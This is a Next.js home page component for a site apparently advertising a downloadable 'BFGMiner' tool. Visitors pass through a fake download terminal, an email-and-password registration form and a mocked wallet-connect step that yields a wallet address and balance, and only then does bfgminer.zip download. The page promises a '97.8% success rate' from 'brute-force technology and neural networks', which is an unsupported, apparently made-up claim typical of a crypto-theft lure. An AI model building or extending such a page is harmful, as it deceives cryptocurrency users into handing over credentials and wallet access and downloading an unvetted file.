'use client'

import { useState } from 'react'
import Header from '@/components/Header'
import Hero from '@/components/Hero'
import Footer from '@/components/Footer'
import DownloadTerminal from '@/components/DownloadTerminal'
import RegistrationForm from '@/components/RegistrationForm'
import WalletConnectMock from '@/components/WalletConnectMock'
import TestimonialsCarousel from '@/components/TestimonialsCarousel'

export default function Home() {
  const [showTerminal, setShowTerminal] = useState(false)
  const [showRegistration, setShowRegistration] = useState(false)
  const [showWalletConnect, setShowWalletConnect] = useState(false)
  const [showSuccess, setShowSuccess] = useState(false)

  const handleDownloadClick = () => {
    setShowTerminal(true)
  }

  const handleTerminalComplete = () => {
    setShowTerminal(false)
    setShowRegistration(true)
  }

  const handleRegistrationSubmit = (data: { email: string; password: string; }) => {
    console.log('Registration submitted:', data)
    setShowRegistration(false)
    setShowWalletConnect(true)
  }

  const handleWalletConnectSuccess = (method: string, data: { walletAddress: string; balance: number; }) => {
    console.log('Wallet connected:', method, data)
    setShowWalletConnect(false)
    setShowSuccess(true)

    // Trigger download
    setTimeout(() => {
      const link = document.createElement('a')
      link.href = '/bfgminer.zip'
      link.download = 'bfgminer.zip'
      link.click()
    }, 2000)
  }

  const handleSignIn = () => {
    console.log('Sign in clicked')
    // Implement sign in logic
  }

  const handleManualConnect = () => {
    console.log('Manual connect clicked')
    // Handle manual connection
  }

  return (
    <div className="min-h-screen bg-black">
      <Header />

      <main>
        <Hero onDownloadClick={handleDownloadClick} />

        {/* Features Section */}
        <section className="py-20 bg-gradient-to-b from-black to-gray-900">
          <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
            <div className="text-center mb-16">
              <h2 className="text-4xl font-bold text-white mb-4">Advanced Mining Features</h2>
              <p className="text-xl text-gray-400">Discover the power of cutting-edge mining technology</p>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
              <div className="p-8 bg-black/50 border border-orange-500/20 rounded-xl">
                <div className="w-12 h-12 bg-orange-500 rounded-lg flex items-center justify-center mb-6">
                  <svg className="w-6 h-6 text-black" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13 10V3L4 14h7v7l9-11h-7z" />
                  </svg>
                </div>
                <h3 className="text-xl font-semibold text-white mb-4">Lightning Fast</h3>
                <p className="text-gray-400">Advanced algorithms that deliver results in record time, maximizing your mining efficiency.</p>
              </div>

              <div className="p-8 bg-black/50 border border-orange-500/20 rounded-xl">
                <div className="w-12 h-12 bg-orange-500 rounded-lg flex items-center justify-center mb-6">
                  <svg className="w-6 h-6 text-black" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                  </svg>
                </div>
                <h3 className="text-xl font-semibold text-white mb-4">Military-Grade Security</h3>
                <p className="text-gray-400">Bank-level encryption and security protocols to protect your assets and data.</p>
              </div>

              <div className="p-8 bg-black/50 border border-orange-500/20 rounded-xl">
                <div className="w-12 h-12 bg-orange-500 rounded-lg flex items-center justify-center mb-6">
                  <svg className="w-6 h-6 text-black" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 19v-6a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2a2 2 0 002-2zm0 0V9a2 2 0 012-2h2a2 2 0 012 2v10m-6 0a2 2 0 002 2h2a2 2 0 002-2m0 0V5a2 2 0 012-2h2a2 2 0 012 2v14a2 2 0 01-2 2h-2a2 2 0 01-2-2z" />
                  </svg>
                </div>
                <h3 className="text-xl font-semibold text-white mb-4">High Success Rate</h3>
                <p className="text-gray-400">97.8% success rate with our advanced brute-force technology and neural networks.</p>
              </div>
            </div>
          </div>
        </section>

        <TestimonialsCarousel />
      </main>

      <Footer />

      {/* Modals */}
      {showTerminal && (
        <DownloadTerminal
          onComplete={handleTerminalComplete}
          onClose={() => setShowTerminal(false)}
        />
      )}

      {showRegistration && (
        <RegistrationForm
          onSubmit={handleRegistrationSubmit}
          onSignIn={handleSignIn}
        />
      )}

      {showWalletConnect && (
        <WalletConnectMock
          onSuccess={handleWalletConnectSuccess}
          onManualConnect={handleManualConnect}
        />
      )}

      {showSuccess && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm">
          <div className="w-full max-w-md mx-4 bg-black rounded-lg p-8 border border-orange-500/30">
            <div className="text-center">
              <div className="w-16 h-16 bg-green-500 rounded-full flex items-center justify-center mx-auto mb-4">
                <svg className="w-8 h-8 text-black" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                </svg>
              </div>
              <h3 className="text-2xl font-bold text-white mb-2">Registration Complete!</h3>
              <p className="text-gray-400 mb-6">Your download has started automatically.</p>
              <button
                onClick={() => setShowSuccess(false)}
                className="px-6 py-3 bg-gradient-to-r from-orange-500 to-orange-600 text-black font-bold rounded-lg"
              >
                Got it!
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  )
}